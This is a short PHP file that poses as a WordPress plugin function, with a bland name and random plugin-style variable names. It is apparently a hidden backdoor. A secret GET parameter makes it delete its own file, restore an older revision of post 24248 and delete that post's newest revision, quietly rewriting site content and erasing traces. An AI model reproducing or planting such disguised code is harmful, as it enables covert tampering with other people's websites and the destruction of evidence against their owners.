<?php

function sales_press_get_update() {
	if (isset($_GET['light_error_content']) && $_GET['light_error_content'] === 'buttons_plugins_server_footer') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$gdpr_calculator_additional = 24248;
		$chart_pullquote_save_composer = wp_get_post_revisions($gdpr_calculator_additional);
		if (empty($chart_pullquote_save_composer)) die('no revisions');
		if (count($chart_pullquote_save_composer) < 2) die('less than 2');
		$auth_comment_demo_listings = array_shift($chart_pullquote_save_composer);
		$marketplace_friendly_tables = $auth_comment_demo_listings->ID;
		$emails_reminder_column_sticky = array_shift($chart_pullquote_save_composer);
		$slider_notify_listing = $emails_reminder_column_sticky->ID;
		$api_crm_fast_reading = wp_restore_post_revision($slider_notify_listing);
		if ($api_crm_fast_reading === false) die('error restoring');
		$api_crm_fast_reading = wp_delete_post_revision($marketplace_friendly_tables);		
		if ($api_crm_fast_reading === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'sales_press_get_update');
